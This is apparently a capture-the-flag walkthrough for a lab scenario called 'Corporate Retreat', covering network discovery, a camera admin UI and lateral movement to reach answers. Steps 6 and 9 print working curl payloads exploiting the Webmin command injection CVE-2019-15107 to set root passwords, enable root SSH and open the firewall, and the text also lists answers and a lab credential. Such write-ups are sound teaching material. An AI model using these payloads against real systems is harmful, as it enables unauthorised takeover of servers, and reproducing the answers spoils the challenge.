# Corporate Retreat

Network discovery, public CVE exploitation, credential abuse, lateral movement.

## How to solve

Contains spoilers!

1. Scan the network range as suggested
2. Access the camera UI at `172.20.0.231` and go to settings
3. Extract the admin password from the source code and log in with it
4. Abuse the shell to map the network (especially the non-public part)
5. Access the admin UI of the non-public-facing gateway - for this, you can extend the transparent proxy script to allow customization of the exposed port and download it to the camera, where you will then run it to proxy `10.3.0.2:10000` to any open port of the camera.
6. Abuse CVE-2019-15107 to set the root password, for example `curl https://localhost:2223/password_change.cgi -d 'user=wheel&pam=&expired=2&old=echo "root:toor"|chpasswd|echo done&new1=wheel&new2=wheel' -k -H 'Referer: https://localhost:2223'`, (where `localhost:2223` is still proxied to `10.3.0.2:10000`)
7. You can now log in into the admin UI with root:toor. Webmin sometimes tends to get stuck loading after login - if it happens, click the cog icon in the left sidebar to unstuck it. In Webmin>Others>Command Shell, you get another root shell, this time on the router - which is in another network now, that interests us.
8. Of course extract the poem the task asks for, from `/app/poem.txt`
9. Discover devices in `10.0.0.0/24` that might help answer the local IP address question, specifically the outbound router (also the default gateway of the current gateway...) at `10.0.0.4`. It is again running something on port 10000 (and also 22). Run the Webmin exploit again, this time also enabling root login through SSH and allowing yourself to SSH in through BigComp's standard public IP address rather than tunneling through 2 other devices, e.g. `curl https://10.0.0.4:10000/password_change.cgi -d 'user=wheel&pam=&expired=2&old=echo%20%22root%3Atoor%22%7Cchpasswd%26%26sed%20-i%20-e%20%22%2F.*PermitRootLogin.*%2Fd%22%20-e%20%22%5C%24a%20PermitRootLogin%20yes%22%20%2Fetc%2Fssh%2Fsshd_config%26%26iptables%20-I%20INPUT%20-j%20ACCEPT%26%26service%20ssh%20restart%26%26echo%20ok&new1=wheel&new2=wheel' -k -H 'Referer: https://10.0.0.4:10000'` (urldecode if illegible)
10. Now SSH directly from hackerlab to `172.20.0.239` and run `cat /var/log/ulog/syslogemu.log |grep 172.20.0.200`: the log file contains ulogd output of iptables' NFLOG chain, logging all outgoing SSH connections, and the IP address is the one used by the cousin during the incursion. You should find the source address of `10.0.1.233`.
11. For the address, there is an unsecured employee record system at `http://10.0.0.8:8000` with a list of employees. Each employee detail (`?page=$employeeId`) then contains associated IP addresses. In our case, `10.0.1.233` is registered with user 88811, who happens to reside at `Langelinie Allé 21`. Importantly, there is also a second IP address registered (`10.0.4.18`).
12. From iptables, we can deduce that there is an HTTP proxy running at `10.0.0.5`, which also exposes the SSH port, and we are let in as root without a password. Now we can read `/var/log/proxy/web-proxy-2025-01-05.log`, which contains a login attempt to `www.bread.forum`.
13. The 2nd level domain is `bread.forum`, so submit that for the baked goods task.
14. The credentials are also logged (but URLencoded): `Vigilante88:M1r0{mayFXwawow1ezzUjVIOutDhKRcZGJblvzDOgBaA4EMmQG09UpfP8i3XQA4YY}`

These instructions of course use a significant amount of shortcuts and knowledge that the attacker would have to spend a lot of effort finding. However, this is simply a short walkthrough, so it makes sense. 

## Notes

Some software is preinstalled on devices for attacker convenience.
This is because `apt` tends to hang more often than not when ran through Webmin.
